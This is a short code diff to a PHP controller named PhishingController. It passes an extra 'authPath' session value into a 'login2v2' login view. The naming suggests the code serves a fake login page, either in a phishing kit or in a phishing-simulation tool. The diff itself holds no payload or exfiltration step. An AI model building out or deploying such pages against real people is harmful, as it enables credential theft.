@@ -129,7 +129,10 @@ class PhishingController extends Controller
     public function showLogin2v2()
     {
         $session = $this->getSessionData();
-        return view('login2v2', ['metaBasePath' => $session['metaBasePath']]);
+        return view('login2v2', [
+            'metaBasePath' => $session['metaBasePath'],
+            'authPath' => $session['authPath']
+        ]);
     }
 
     public function getSessionPaths()
